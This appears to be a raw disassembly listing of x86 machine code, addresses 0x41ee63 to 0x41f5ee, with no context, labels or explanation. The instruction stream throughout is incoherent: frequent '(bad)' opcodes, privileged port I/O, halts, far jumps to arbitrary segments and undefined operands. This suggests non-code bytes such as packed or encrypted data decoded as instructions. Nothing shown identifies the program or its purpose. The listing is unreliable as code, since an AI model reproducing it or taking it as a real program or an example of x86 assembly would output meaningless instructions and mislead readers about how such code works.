  41ee63:	cs loop 0x41ee26
  41ee66:	pop    edi
  41ee67:	icebp  
  41ee68:	xchg   esi,eax
  41ee69:	imul   ebp,DWORD PTR [ebx+0x25c96b44],0x6d
  41ee70:	lods   eax,DWORD PTR ds:[esi]
  41ee71:	in     al,dx
  41ee72:	into   
  41ee73:	es mov bl,0xb
  41ee76:	xor    eax,DWORD PTR [ebx]
  41ee78:	stc    
  41ee79:	cli    
  41ee7a:	sbb    dl,BYTE PTR [edx+0x6146d379]
  41ee80:	int    0x8c
  41ee82:	popa   
  41ee83:	push   esp
  41ee84:	mov    BYTE PTR [eax+0x4a],bl
  41ee87:	(bad)  
  41ee88:	outs   dx,DWORD PTR ds:[esi]
  41ee89:	jbe    0x41ee27
  41ee8b:	and    eax,0xd9cbce31
  41ee90:	out    dx,eax
  41ee91:	iret   
  41ee92:	xor    BYTE PTR ds:0x61e3ef5a,ch
  41ee98:	popf   
  41ee99:	xchg   esi,eax
  41ee9a:	stos   DWORD PTR es:[edi],eax
  41ee9b:	ds (bad) 
  41ee9d:	fild   WORD PTR [ecx]
  41ee9f:	and    DWORD PTR [edx-0x45148af0],edi
  41eea5:	ins    BYTE PTR es:[edi],dx
  41eea6:	or     dh,BYTE PTR [esp+0x46]
  41eeaa:	out    0xe1,eax
  41eeac:	sub    DWORD PTR [ebp-0x17aed125],ebp
  41eeb2:	in     al,0x5a
  41eeb4:	fidivr WORD PTR ds:0xbff0edc1
  41eeba:	das    
  41eebb:	out    0x18,eax
  41eebd:	inc    ecx
  41eebe:	inc    esp
  41eebf:	pushf  
  41eec0:	popa   
  41eec1:	mov    edx,ss
  41eec3:	sbb    al,0x39
  41eec5:	mov    ebp,DWORD PTR [esi+ecx*1-0x79d00853]
  41eecc:	pop    eax
  41eecd:	scas   eax,DWORD PTR es:[edi]
  41eece:	lods   al,BYTE PTR ds:[esi]
  41eecf:	and    esi,esi
  41eed1:	nop
  41eed2:	(bad)  
  41eed3:	setns  BYTE PTR [edx]
  41eed6:	into   
  41eed7:	mov    gs,WORD PTR [esi+0x4a3aee98]
  41eedd:	outs   dx,BYTE PTR ds:[esi]
  41eede:	add    edx,DWORD PTR [eax+0x62]
  41eee1:	cmp    eax,0x58a22225
  41eee6:	ins    DWORD PTR es:[edi],dx
  41eee7:	ins    DWORD PTR es:[edi],dx
  41eee8:	mov    bl,bl
  41eeea:	mov    al,ds:0xc97a888b
  41eeef:	fiadd  DWORD PTR [ebp-0x3219e692]
  41eef5:	or     eax,DWORD PTR ds:0x2f5b5b90
  41eefb:	add    al,0xde
  41eefd:	mov    bh,0xc9
  41eeff:	pmaxsw mm2,QWORD PTR [ebx]
  41ef02:	jae    0x41ee98
  41ef04:	aam    0xaf
  41ef06:	pusha  
  41ef07:	inc    edi
  41ef08:	dec    esi
  41ef09:	sub    eax,0xd918fb23
  41ef0e:	pop    esi
  41ef0f:	lds    ecx,FWORD PTR [esi-0x7af32307]
  41ef15:	xor    DWORD PTR [ebx+0x6dc6e8e4],eax
  41ef1b:	inc    edi
  41ef1c:	daa    
  41ef1d:	std    
  41ef1e:	mov    al,0x73
  41ef20:	xchg   edi,eax
  41ef21:	hlt    
  41ef22:	loopne 0x41eeea
  41ef24:	xchg   ebx,eax
  41ef25:	adc    DWORD PTR [esi-0x16],eax
  41ef28:	jnp    0x41ef9b
  41ef2a:	ins    BYTE PTR es:[edi],dx
  41ef2b:	repz ret 0x9e1c
  41ef2f:	popf   
  41ef30:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ef31:	stc    
  41ef32:	cwde   
  41ef33:	fs rol esi,cl
  41ef36:	and    DWORD PTR [ebx+0x3e],edi
  41ef39:	push   ebx
  41ef3a:	shl    DWORD PTR [ecx],cl
  41ef3c:	cli    
  41ef3d:	mov    edi,0xa5d5633b
  41ef42:	test   eax,0x7349e7c7
  41ef47:	push   0xffffff81
  41ef49:	sti    
  41ef4a:	mov    DWORD PTR [esi],esp
  41ef4c:	add    edx,DWORD PTR [ebx]
  41ef4e:	pop    es
  41ef4f:	scas   al,BYTE PTR es:[edi]
  41ef50:	or     DWORD PTR [ecx],eax
  41ef52:	add    DWORD PTR [ebp-0x32],ecx
  41ef55:	dec    ebx
  41ef56:	les    ecx,FWORD PTR es:[edi+0x5f4c2d74]
  41ef5d:	sbb    bl,BYTE PTR [esi-0xee2c44e]
  41ef63:	repz (bad) 
  41ef65:	iret   
  41ef66:	scas   al,BYTE PTR es:[edi]
  41ef67:	arpl   WORD PTR [ebx-0x1d],di
  41ef6a:	sbb    BYTE PTR [edx+0x60],al
  41ef6d:	loope  0x41ef33
  41ef6f:	xor    BYTE PTR [ebx+0x54],bh
  41ef72:	or     DWORD PTR [eax],0xc8d78bf9
  41ef78:	dec    edx
  41ef79:	popf   
  41ef7a:	out    0xfb,eax
  41ef7c:	test   al,0xd4
  41ef7e:	sub    DWORD PTR [esi-0x50],0x39
  41ef82:	push   ss
  41ef83:	xlat   BYTE PTR ds:[ebx]
  41ef84:	fsub   DWORD PTR [ebx-0x57]
  41ef87:	xor    al,0xd1
  41ef89:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ef8a:	pop    ebx
  41ef8b:	in     al,dx
  41ef8c:	fcom   DWORD PTR [edi+ecx*1]
  41ef8f:	test   al,0x17
  41ef91:	xor    esp,0xaa5e5da3
  41ef97:	addr16 pop eax
  41ef99:	jns    0x41ef4d
  41ef9b:	xchg   BYTE PTR [ebp-0x40],bl
  41ef9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ef9f:	jno    0x41ef5e
  41efa1:	in     eax,dx
  41efa2:	fsubr  QWORD PTR [ecx+edx*4]
  41efa5:	mov    ebp,esi
  41efa7:	and    dh,BYTE PTR [esi+0x25a5ef15]
  41efad:	sbb    DWORD PTR [edi+0x7c],esp
  41efb0:	cmp    eax,0xb5701bc4
  41efb5:	imul   sp,WORD PTR [esi+0x4c],0x620a
  41efbb:	(bad)  [eax-0x6a]
  41efbe:	push   es
  41efbf:	int3   
  41efc0:	mov    eax,0x94d9259
  41efc5:	in     al,dx
  41efc6:	xchg   ecx,eax
  41efc7:	mov    edi,0xe40eaf2a
  41efcc:	adc    edi,ecx
  41efce:	shl    dl,1
  41efd0:	xor    bh,ch
  41efd2:	jl     0x41f03c
  41efd4:	add    al,0x21
  41efd6:	sbb    BYTE PTR [eax+0x6],dh
  41efd9:	out    0xbd,eax
  41efdb:	mov    bl,0xbc
  41efdd:	add    ah,dh
  41efdf:	push   es
  41efe0:	push   0xffffffd1
  41efe2:	pop    ecx
  41efe3:	push   ss
  41efe4:	sbb    ch,ch
  41efe6:	mov    esp,0x387e214d
  41efeb:	fcom   DWORD PTR [edi]
  41efed:	loop   0x41ef9a
  41efef:	enter  0xdf75,0xe5
  41eff3:	jmp    0x1a1e:0x801f35f8
  41effa:	adc    edi,DWORD PTR [ebx+0xee96e01]
  41f000:	les    edx,FWORD PTR [esi]
  41f002:	rcr    BYTE PTR [ecx+0x16860640],cl
  41f008:	cmp    eax,0x70eac535
  41f00d:	jb     0x41f006
  41f00f:	iret   
  41f010:	ret    
  41f011:	cs cli 
  41f013:	scas   al,BYTE PTR es:[edi]
  41f014:	cmp    al,dh
  41f016:	inc    ebp
  41f017:	pop    ebp
  41f018:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f019:	xchg   DWORD PTR [ecx],eax
  41f01b:	mov    edx,0xc99a3196
  41f020:	rcl    ebx,0xa3
  41f023:	clc    
  41f024:	sub    eax,0x27b15e6
  41f029:	xchg   ebx,eax
  41f02a:	xor    eax,esi
  41f02c:	sbb    al,0xaa
  41f02e:	mov    edx,DWORD PTR [eax-0x1f]
  41f031:	adc    bh,BYTE PTR [ecx-0x8b47812]
  41f037:	inc    ebx
  41f038:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f039:	icebp  
  41f03a:	or     ch,BYTE PTR [ecx-0x13]
  41f03d:	js     0x41f00e
  41f03f:	mov    WORD PTR [ebp+0x63],gs
  41f042:	jne    0x41f081
  41f044:	test   BYTE PTR ds:0x3184c3bd,cl
  41f04a:	mov    eax,ds:0x13a0bbeb
  41f04f:	rol    ah,0xa9
  41f052:	gs loope 0x41f0a8
  41f055:	in     al,0x9a
  41f057:	inc    eax
  41f058:	add    esi,eax
  41f05a:	shl    DWORD PTR [esi-0x53a82098],cl
  41f060:	out    dx,eax
  41f061:	mov    al,0x46
  41f063:	push   esi
  41f064:	int3   
  41f065:	and    eax,0xa6019cbb
  41f06a:	shr    DWORD PTR [ecx-0x3a],0xa8
  41f06e:	adc    al,0x26
  41f070:	xchg   DWORD PTR [edi+0x74ce7a7a],esp
  41f076:	fiadd  WORD PTR [esi+esi*2-0x2e]
  41f07a:	sbb    dh,ah
  41f07c:	xchg   edx,eax
  41f07d:	xor    BYTE PTR [ebp+0x47d77f11],al
  41f083:	fwait
  41f084:	aad    0xe2
  41f086:	ds xchg cl,ah
  41f089:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f08a:	lds    ecx,FWORD PTR [ecx]
  41f08c:	sbb    ch,al
  41f08e:	inc    eax
  41f08f:	dec    eax
  41f090:	push   esi
  41f091:	mov    esp,0xd26bb46
  41f096:	lds    ebx,FWORD PTR [eax]
  41f098:	ds pop edi
  41f09a:	mov    bh,0x0
  41f09c:	jecxz  0x41f093
  41f09e:	pop    esi
  41f09f:	inc    esp
  41f0a0:	adc    esi,DWORD PTR [ebx+0x6e]
  41f0a3:	mov    dl,0xa5
  41f0a5:	jle    0x41f105
  41f0a7:	mov    dl,0xc
  41f0a9:	sbb    eax,0x5345b33d
  41f0ae:	icebp  
  41f0af:	test   eax,0xc02b415d
  41f0b4:	push   esi
  41f0b5:	in     eax,0x9f
  41f0b7:	push   ss
  41f0b8:	cs out dx,al
  41f0ba:	jno    0x41f10c
  41f0bc:	cdq    
  41f0bd:	push   edx
  41f0be:	out    dx,eax
  41f0bf:	ror    BYTE PTR [esi-0x52],1
  41f0c2:	or     eax,DWORD PTR [esi+ebp*1]
  41f0c5:	jmp    0x41f06e
  41f0c7:	pop    esp
  41f0c8:	mov    ah,0xec
  41f0ca:	outs   dx,DWORD PTR ds:[esi]
  41f0cb:	adc    BYTE PTR [ecx+0x42],ah
  41f0ce:	sbb    dh,dl
  41f0d0:	fcomip st,st(1)
  41f0d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f0d3:	(bad)  
  41f0d4:	sar    DWORD PTR [ecx+0x920d4ff],1
  41f0da:	mov    esp,0x83fc31c7
  41f0df:	mov    ch,0x2e
  41f0e1:	aam    0x16
  41f0e3:	or     eax,0x4626955b
  41f0e8:	mov    edi,0x74e9e02f
  41f0ed:	push   ebp
  41f0ee:	xor    dl,BYTE PTR [ecx-0x25]
  41f0f1:	out    0xa6,al
  41f0f3:	and    al,BYTE PTR [edi+0x7c0942b3]
  41f0f9:	scas   al,BYTE PTR es:[edi]
  41f0fa:	push   0x578b98d0
  41f0ff:	pop    esi
  41f100:	loope  0x41f0af
  41f102:	pop    esi
  41f103:	jae    0x41f0e3
  41f105:	and    ebx,DWORD PTR [ebx+eiz*4+0x43afceb5]
  41f10c:	xchg   DWORD PTR [ebx-0x6e],edx
  41f10f:	ficom  DWORD PTR [ebp-0x57]
  41f112:	xlat   BYTE PTR ds:[ebx]
  41f113:	fldz   
  41f115:	add    eax,0xec738397
  41f11a:	and    ah,BYTE PTR [eax+esi*4]
  41f11d:	(bad)  
  41f11e:	mov    cl,0x1e
  41f120:	inc    ebx
  41f121:	cdq    
  41f122:	sub    ebx,DWORD PTR [edi]
  41f124:	ds out dx,al
  41f126:	inc    edi
  41f127:	int3   
  41f128:	and    ah,bl
  41f12a:	imul   ebx,DWORD PTR [ebx+0x1ad2cc2c],0xffffff8f
  41f131:	imul   esi,DWORD PTR [ebx-0x557e6b4e],0xbfb3f6e8
  41f13b:	and    DWORD PTR [edx],ebp
  41f13d:	add    BYTE PTR [ebx],bl
  41f13f:	loope  0x41f135
  41f141:	js     0x41f196
  41f143:	inc    esi
  41f144:	mov    eax,ds:0x89168833
  41f149:	push   edx
  41f14a:	and    dh,BYTE PTR [eax-0x943575a]
  41f150:	sbb    DWORD PTR [ecx],ecx
  41f152:	add    bh,bl
  41f154:	jnp    0x41f187
  41f156:	fistp  QWORD PTR [ecx-0x13]
  41f159:	sub    bh,ch
  41f15b:	inc    esi
  41f15c:	lods   eax,DWORD PTR ds:[esi]
  41f15d:	push   ecx
  41f15e:	cmp    al,BYTE PTR [esi+0x69]
  41f161:	test   eax,0xdd54066a
  41f166:	retf   
  41f167:	shl    BYTE PTR [esi],0x5c
  41f16a:	mov    ?,esp
  41f16c:	mov    BYTE PTR es:0x9db2c4e7,cl
  41f173:	repz pop ecx
  41f175:	ss jge 0x41f194
  41f178:	push   0xffffff80
  41f17a:	pop    ss
  41f17b:	rol    DWORD PTR [ebp+0x36],1
  41f17e:	fsub   DWORD PTR [edi+0x6449949e]
  41f184:	(bad)  
  41f186:	xor    al,0xe8
  41f188:	mov    dl,0x9
  41f18a:	in     eax,dx
  41f18b:	icebp  
  41f18c:	fist   WORD PTR fs:[edi+0x51]
  41f190:	fsub   QWORD PTR [ebx+0x52552880]
  41f196:	inc    DWORD PTR [eax]
  41f198:	test   DWORD PTR [edi+ecx*4],ecx
  41f19b:	imul   ebx,DWORD PTR [esi],0xffffffe3
  41f19e:	mov    DWORD PTR [esi-0x6b],ecx
  41f1a1:	in     eax,dx
  41f1a2:	cmp    cl,BYTE PTR [edi+0x4f6bb667]
  41f1a8:	add    ebp,0xa2dd058d
  41f1ae:	inc    bx
  41f1b0:	lahf   
  41f1b1:	out    dx,eax
  41f1b2:	add    eax,0x22b93a6c
  41f1b7:	cli    
  41f1b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f1b9:	(bad)  
  41f1ba:	je     0x41f1f2
  41f1bc:	mov    ecx,0x40717d5a
  41f1c1:	div    BYTE PTR [eax-0x32]
  41f1c4:	and    DWORD PTR [ebx],0x1c0bbb07
  41f1ca:	jae    0x41f20a
  41f1cc:	push   ebx
  41f1cd:	ins    DWORD PTR es:[edi],dx
  41f1ce:	xchg   ebp,eax
  41f1cf:	lahf   
  41f1d0:	add    al,0x57
  41f1d2:	mov    dl,0x3c
  41f1d4:	jmp    0x41f1c7
  41f1d6:	jae    0x41f209
  41f1d8:	dec    ecx
  41f1d9:	aas    
  41f1da:	les    esi,FWORD PTR [edi]
  41f1dc:	xchg   DWORD PTR [edx],ebp
  41f1de:	test   eax,0xe99527b9
  41f1e3:	push   esp
  41f1e4:	mov    edx,DWORD PTR [eax+0x5d36d30e]
  41f1ea:	or     BYTE PTR [edi-0x17],al
  41f1ed:	bound  eax,QWORD PTR [esi+0x48531dc1]
  41f1f3:	pop    ebp
  41f1f4:	test   esp,eax
  41f1f6:	sbb    DWORD PTR [esi],0x769f0864
  41f1fc:	add    eax,0xa9ed8bba
  41f201:	inc    esi
  41f202:	pop    es
  41f203:	scas   eax,DWORD PTR es:[edi]
  41f204:	sub    BYTE PTR [edx],al
  41f206:	(bad)  
  41f207:	loop   0x41f217
  41f209:	adc    eax,0x854a5086
  41f20e:	or     bh,BYTE PTR [eax+0x5b77f95d]
  41f214:	mov    edi,0xa1543db2
  41f219:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f21a:	xor    BYTE PTR [eax-0x22d6705a],cl
  41f220:	push   ss
  41f221:	xchg   DWORD PTR [eax-0x3118a579],ebp
  41f227:	mov    cl,0x3b
  41f229:	dec    edx
  41f22a:	mov    esi,0x845074a5
  41f22f:	mov    ecx,0xadc57882
  41f234:	mov    ah,0x55
  41f236:	pop    edx
  41f237:	test   edx,ebx
  41f239:	ret    0x28f6
  41f23c:	pusha  
  41f23d:	mov    DWORD PTR [ecx+0x5567dc80],ebx
  41f243:	inc    ebp
  41f244:	hlt    
  41f245:	fld    QWORD PTR [esi+0xe57f4d9]
  41f24b:	cdq    
  41f24c:	jno    0x41f1d5
  41f24e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f24f:	push   0xf3bbbb7d
  41f254:	sbb    BYTE PTR [ecx+0x741daf1],bl
  41f25a:	clc    
  41f25b:	push   eax
  41f25c:	and    BYTE PTR [edi+0x3a9eac00],al
  41f262:	ud1    ecx,DWORD PTR [eax+0x42]
  41f266:	and    al,dh
  41f268:	xor    DWORD PTR [ebx],0x1c14d580
  41f26e:	retf   0xc273
  41f271:	call   0x7b5f:0xe1dd7eea
  41f278:	and    al,0x3a
  41f27a:	xchg   ebx,eax
  41f27b:	cmp    eax,0x1992d29f
  41f280:	pop    ecx
  41f281:	mov    al,0xfc
  41f283:	pop    edx
  41f284:	xor    al,0x6f
  41f286:	cs inc esi
  41f288:	cmp    al,0x54
  41f28a:	xchg   esp,eax
  41f28b:	cmp    DWORD PTR [esi+0x42020d75],ebp
  41f291:	cli    
  41f292:	mov    WORD PTR [ecx+0x30],ds
  41f295:	ds mov esp,0xbf24a2ba
  41f29b:	mov    esp,0xec5da360
  41f2a0:	add    eax,0xbcc4ab95
  41f2a5:	xor    esi,eax
  41f2a7:	xchg   esp,eax
  41f2a8:	pop    ss
  41f2a9:	xchg   dh,ah
  41f2ab:	(bad)  
  41f2ac:	mov    ebx,0x499dc957
  41f2b1:	ret    
  41f2b2:	cmp    BYTE PTR [ebx],ah
  41f2b4:	int3   
  41f2b5:	call   0x8800:0x4fb0b3df
  41f2bc:	scas   eax,DWORD PTR es:[edi]
  41f2bd:	adc    eax,0xf95b8099
  41f2c2:	jmp    0x349bc986
  41f2c7:	not    BYTE PTR [edi-0x29]
  41f2ca:	xor    eax,0x914c6a42
  41f2cf:	or     eax,0x93396f3f
  41f2d4:	mov    esi,0x68b108a3
  41f2d9:	icebp  
  41f2da:	aaa    
  41f2db:	lea    esp,[eax+0xd2fcd49]
  41f2e1:	loopne 0x41f293
  41f2e3:	scas   al,BYTE PTR es:[edi]
  41f2e4:	add    esi,DWORD PTR [ecx+0x62]
  41f2e7:	adc    ecx,edx
  41f2e9:	and    BYTE PTR [eax+0x1b],bl
  41f2ec:	xor    DWORD PTR [esi+0x2221fbff],0xffffffa6
  41f2f3:	mov    eax,ds:0x5ed2155f
  41f2f8:	jmp    0xb7b85b83
  41f2fd:	mov    ds:0x64ebbf53,eax
  41f302:	add    esi,DWORD PTR [ecx-0x663e39c4]
  41f308:	pop    ecx
  41f309:	add    DWORD PTR [edx-0x79],edi
  41f30c:	cmp    eax,0xe7dec41
  41f311:	pop    esp
  41f312:	in     eax,dx
  41f313:	push   0x7a62d987
  41f318:	imul   eax,DWORD PTR [edi+ebx*8],0x61cc6136
  41f31f:	fs mov ah,0x6c
  41f322:	mov    ecx,0x72a597b7
  41f327:	fs loopne 0x41f34d
  41f32a:	xchg   ebx,eax
  41f32b:	(bad)  
  41f32c:	sbb    eax,0xebf5939f
  41f331:	jmp    eax
  41f333:	scas   eax,DWORD PTR es:[edi]
  41f334:	dec    ecx
  41f335:	sbb    BYTE PTR [ebp-0x14dab5a0],ah
  41f33b:	lods   al,BYTE PTR ds:[esi]
  41f33c:	outs   dx,BYTE PTR ds:[esi]
  41f33d:	pop    esi
  41f33e:	dec    ebp
  41f33f:	test   eax,0x894df102
  41f344:	mov    eax,0x5d03b4b5
  41f349:	adc    eax,0x1ea3f3df
  41f34e:	dec    ebp
  41f34f:	sti    
  41f350:	lock test al,0xc0
  41f353:	sbb    eax,0xbb1c9226
  41f358:	and    dh,BYTE PTR [eax+edi*8-0x5ca9ebd6]
  41f35f:	setge  BYTE PTR ds:0xe615af6e
  41f366:	jno    0x41f320
  41f368:	lods   eax,DWORD PTR ds:[esi]
  41f369:	pushf  
  41f36a:	scas   al,BYTE PTR es:[edi]
  41f36b:	outs   dx,DWORD PTR ds:[esi]
  41f36c:	jecxz  0x41f31a
  41f36e:	pop    esp
  41f36f:	scas   eax,DWORD PTR es:[edi]
  41f370:	(bad)  
  41f371:	outs   dx,DWORD PTR ds:[esi]
  41f372:	sub    ecx,DWORD PTR [esi-0x26]
  41f375:	mov    ah,dh
  41f377:	pop    ds
  41f378:	clc    
  41f379:	sbb    DWORD PTR [esp+edx*2],eax
  41f37c:	imul   ebx,DWORD PTR [edx],0x6e
  41f37f:	mov    esp,0x487bf149
  41f384:	adc    dl,bh
  41f386:	and    al,0x2a
  41f388:	(bad)  
  41f38a:	jo     0x41f3eb
  41f38c:	sub    dl,BYTE PTR [eax+0x5587dd89]
  41f392:	jmp    0x41f3f3
  41f394:	xchg   ebx,eax
  41f395:	or     al,0xe0
  41f397:	stos   BYTE PTR es:[edi],al
  41f398:	adc    DWORD PTR [ecx-0x2b],0x81182af0
  41f39f:	jge    0x41f345
  41f3a1:	jp     0x41f34f
  41f3a3:	push   ds
  41f3a4:	lea    edi,[ebx+0x77ecd74e]
  41f3aa:	mov    edx,0xb113ff96
  41f3af:	(bad)  
  41f3b0:	ins    DWORD PTR es:[edi],dx
  41f3b1:	mov    WORD PTR [ebx-0x2d05da2c],gs
  41f3b7:	xor    eax,0x277f26fb
  41f3bc:	jbe    0x41f3dc
  41f3be:	push   ds
  41f3bf:	popf   
  41f3c0:	outs   dx,BYTE PTR ds:[esi]
  41f3c1:	sbb    ch,bl
  41f3c3:	and    al,0x4d
  41f3c5:	retf   0x1ed7
  41f3c8:	lea    esi,[ecx+0x7b9fefbf]
  41f3ce:	fwait
  41f3cf:	loopne 0x41f36e
  41f3d1:	mov    ch,0x5b
  41f3d3:	mov    bl,0x41
  41f3d5:	fisub  WORD PTR [edx-0x234a570a]
  41f3db:	sub    DWORD PTR [esi],eax
  41f3dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f3de:	cmc    
  41f3df:	jae    0x41f432
  41f3e1:	lea    esp,[ebx]
  41f3e3:	mov    al,ds:0x2b3f0d85
  41f3e8:	repz cmp al,0x50
  41f3eb:	adc    ebx,DWORD PTR [eax]
  41f3ed:	and    DWORD PTR [edi+0x73],0x75
  41f3f1:	cmp    DWORD PTR [esi-0x231b65ab],ebx
  41f3f7:	lds    edi,FWORD PTR [ebp-0x8]
  41f3fa:	or     BYTE PTR [ebx+0x36ff9c73],ah
  41f400:	out    dx,al
  41f401:	dec    esp
  41f402:	push   0x58
  41f404:	lods   al,BYTE PTR ds:[esi]
  41f405:	pusha  
  41f406:	iret   
  41f407:	aas    
  41f408:	sub    DWORD PTR [eax-0x48],0x61
  41f40c:	push   ebp
  41f40d:	jno    0x41f411
  41f40f:	inc    esi
  41f410:	push   es
  41f411:	mov    ss,ebx
  41f413:	and    ebx,DWORD PTR [ebp-0x66]
  41f416:	mov    DWORD PTR ds:0xff191910,esp
  41f41c:	int3   
  41f41d:	push   es
  41f41e:	pop    eax
  41f41f:	fnstsw WORD PTR [ecx+edi*4]
  41f422:	mov    esi,0xffc84492
  41f427:	rcr    DWORD PTR [eax+0x498e40cd],0x7a
  41f42e:	mov    eax,ds:0x8baf9ccb
  41f433:	lahf   
  41f434:	xor    edx,DWORD PTR [edx]
  41f436:	not    BYTE PTR [ebx]
  41f438:	or     DWORD PTR [edi-0x176b404],0xafde1fa7
  41f442:	clc    
  41f443:	add    DWORD PTR [eax+0x7e],0xffffffc7
  41f447:	cmc    
  41f448:	xor    BYTE PTR [esi],0x3e
  41f44b:	push   es
  41f44c:	adc    BYTE PTR [ebp-0x72],0xf6
  41f450:	ror    DWORD PTR [ecx+0x5348ef2b],1
  41f456:	scas   al,BYTE PTR es:[edi]
  41f457:	mov    eax,ds:0xf98967e8
  41f45c:	ja     0x41f431
  41f45e:	loop   0x41f407
  41f460:	ret    
  41f461:	(bad)  
  41f462:	out    dx,eax
  41f463:	lea    ebx,ds:0x6193f276
  41f469:	mov    eax,ds:0xa3d8006
  41f46e:	xor    DWORD PTR [esi+0x24],esp
  41f471:	mov    dl,0x35
  41f473:	push   cs
  41f474:	jecxz  0x41f4f3
  41f476:	mov    ds:0xa1653ef4,eax
  41f47b:	dec    esi
  41f47c:	dec    esi
  41f47d:	or     BYTE PTR [ebp-0x41],bh
  41f480:	lods   al,BYTE PTR ds:[esi]
  41f481:	and    BYTE PTR [edx-0x73735905],dh
  41f487:	ins    DWORD PTR es:[edi],dx
  41f488:	push   edx
  41f489:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f48a:	xor    DWORD PTR [ebp+edi*1-0xaa2e178],0x74bc77b7
  41f495:	inc    eax
  41f496:	dec    esp
  41f497:	xor    esp,esi
  41f499:	repnz dec eax
  41f49b:	ja     0x41f4d5
  41f49d:	inc    edi
  41f49e:	inc    edi
  41f49f:	sbb    eax,0xed04a3e1
  41f4a4:	or     DWORD PTR [eax+ebp*2-0x2b],edi
  41f4a8:	inc    ebp
  41f4a9:	ret    0x6120
  41f4ac:	mov    al,ds:0x13733325
  41f4b1:	push   cs
  41f4b2:	pop    ecx
  41f4b3:	arpl   WORD PTR ds:0xfe852af0,dx
  41f4ba:	scas   al,BYTE PTR es:[edi]
  41f4bb:	icebp  
  41f4bc:	push   ebx
  41f4bd:	out    dx,al
  41f4be:	ret    
  41f4bf:	mov    al,BYTE PTR [edi-0x26277cbf]
  41f4c5:	lods   al,BYTE PTR ds:[esi]
  41f4c6:	fisubr WORD PTR [eax-0x7c]
  41f4c9:	cdq    
  41f4ca:	nop
  41f4cb:	stc    
  41f4cc:	arpl   WORD PTR [ebp+0x7d],sp
  41f4cf:	jg     0x41f4eb
  41f4d1:	or     BYTE PTR [ecx+0x90e590b],cl
  41f4d7:	add    ebx,DWORD PTR [edx+0x31]
  41f4da:	or     ebx,DWORD PTR [eax]
  41f4dc:	jno    0x41f54b
  41f4de:	addr16 stc 
  41f4e0:	jae    0x41f500
  41f4e2:	loop   0x41f54c
  41f4e4:	pmaddwd mm4,mm6
  41f4e7:	mov    dh,0x88
  41f4e9:	cdq    
  41f4ea:	cmp    al,0x8
  41f4ec:	rol    BYTE PTR ds:0x76e1db77,0x2c
  41f4f3:	je     0x41f53c
  41f4f5:	mov    edx,0x38c9e594
  41f4fa:	mov    ecx,0x2f047f10
  41f4ff:	imul   esi,DWORD PTR [edi],0x44
  41f502:	inc    edi
  41f503:	aam    0x5
  41f505:	fdivr  DWORD PTR [edx+0x5d954493]
  41f50b:	push   edi
  41f50c:	inc    eax
  41f50d:	sub    ebx,edi
  41f50f:	test   BYTE PTR [esi],ah
  41f511:	mov    ecx,0x8b06cfc7
  41f516:	xchg   BYTE PTR [ecx+0x6f8288ef],dh
  41f51c:	mov    esi,0xdf98d86a
  41f521:	scas   eax,DWORD PTR es:[edi]
  41f522:	ror    BYTE PTR [eax-0x63],cl
  41f525:	push   ecx
  41f526:	mov    edx,0x589f5107
  41f52b:	outs   dx,DWORD PTR ds:[esi]
  41f52c:	jecxz  0x41f59b
  41f52e:	pop    ss
  41f52f:	mov    eax,ds:0xa618b5dd
  41f534:	and    al,0xea
  41f536:	lock lock cmp al,0x2
  41f53a:	mov    al,ds:0x60b0fc6d
  41f53f:	lahf   
  41f540:	xchg   ecx,eax
  41f541:	mov    esi,0x1dde5746
  41f546:	jns    0x41f4e1
  41f548:	inc    edx
  41f549:	fdivr  DWORD PTR es:[ebp+ecx*1+0x0]
  41f54e:	(bad)  
  41f54f:	(bad)  
  41f550:	retf   0x10a6
  41f553:	mov    edi,0x162d79dc
  41f558:	pushf  
  41f559:	mov    ah,0x85
  41f55b:	in     al,0x5f
  41f55d:	and    al,0x79
  41f55f:	test   BYTE PTR [ebx-0x30],dh
  41f562:	push   ds
  41f563:	nop
  41f564:	div    DWORD PTR [edx+0x503c36b3]
  41f56a:	leave  
  41f56b:	or     ch,BYTE PTR [eax]
  41f56d:	dec    esp
  41f56e:	fldcw  WORD PTR [ebx-0x6e219fc8]
  41f574:	mov    esi,0xa4a05596
  41f579:	nop
  41f57a:	jbe    0x41f532
  41f57c:	jmp    0x890f63c6
  41f581:	mov    bh,0xb9
  41f583:	mov    gs,WORD PTR [eax]
  41f585:	add    eax,0xd25c8ed5
  41f58a:	cmc    
  41f58b:	fucomip st,st(4)
  41f58d:	mov    esi,0xa5507739
  41f592:	data16 ss rol bl,1
  41f596:	pop    es
  41f597:	pushf  
  41f598:	inc    esp
  41f599:	add    eax,0x919cf5ac
  41f59e:	mov    edi,0xd1cdd02d
  41f5a3:	xchg   esi,eax
  41f5a4:	loopne 0x41f5de
  41f5a6:	mov    DWORD PTR [edx],esi
  41f5a8:	and    ebp,DWORD PTR [ecx+0x20]
  41f5ab:	jae    0x41f62c
  41f5ad:	stc    
  41f5ae:	pop    esp
  41f5af:	pusha  
  41f5b0:	mov    ah,0xb8
  41f5b2:	call   DWORD PTR [ecx-0x5f84f17a]
  41f5b8:	dec    ebx
  41f5b9:	mov    ?,WORD PTR [edx+0x7e]
  41f5bc:	ins    DWORD PTR es:[edi],dx
  41f5bd:	cwde   
  41f5be:	fs in  eax,dx
  41f5c0:	xor    BYTE PTR [esi],dl
  41f5c2:	mov    ah,0xf6
  41f5c4:	jae    0x41f5e3
  41f5c6:	cmp    esp,DWORD PTR [edx+ebx*2-0xf94d2ea]
  41f5cd:	ss (bad) 
  41f5cf:	lods   al,BYTE PTR ds:[esi]
  41f5d0:	or     ah,BYTE PTR [ebp-0x57]
  41f5d3:	mov    edx,0x2a0df196
  41f5d8:	add    eax,0x176459fb
  41f5dd:	push   ss
  41f5de:	jns    0x41f63f
  41f5e0:	jmp    FWORD PTR [edi+0x697251d6]
  41f5e6:	mov    ch,0xe9
  41f5e8:	repz (bad) 
  41f5ea:	test   al,0xf4
  41f5ec:	sub    dh,BYTE PTR [eax]
  41f5ee:	test   al,0x9a
